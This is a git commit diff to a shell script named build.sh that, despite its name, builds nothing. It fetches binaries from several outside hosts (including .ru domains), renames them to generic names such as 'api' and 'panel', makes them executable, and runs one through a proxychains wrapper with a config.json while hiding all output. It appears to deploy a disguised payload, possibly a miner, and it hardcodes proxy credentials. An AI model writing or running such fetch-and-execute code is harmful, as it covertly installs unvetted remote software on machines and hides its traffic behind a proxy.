0c9cdb4e19ed6e8b27574f0eba6a4ec535279d97
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 17:00:03 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -2,8 +2,9 @@ proxy="38.154.227.167"
 port="5868" 
 user="ugursfso"  
 pass="wqn60pnk6m95" 
-git clone https://github.com/55113110159/bring-6.19.3.git && cd bring-6.19.3 && chmod +x SHA256SUMS && chmod +x config.json && chmod +x init-619
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q -O api https://02ip.ru/service && chmod +x api >/dev/null 2>&1
+wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
+wget -q https://iplis.ru/api-server && chmod +x api-server
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
@@ -19,4 +20,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./init-619 -c "config.json" >/dev/null 2>&1
+./api-server ./api -c "config.json" >/dev/null 2>&1
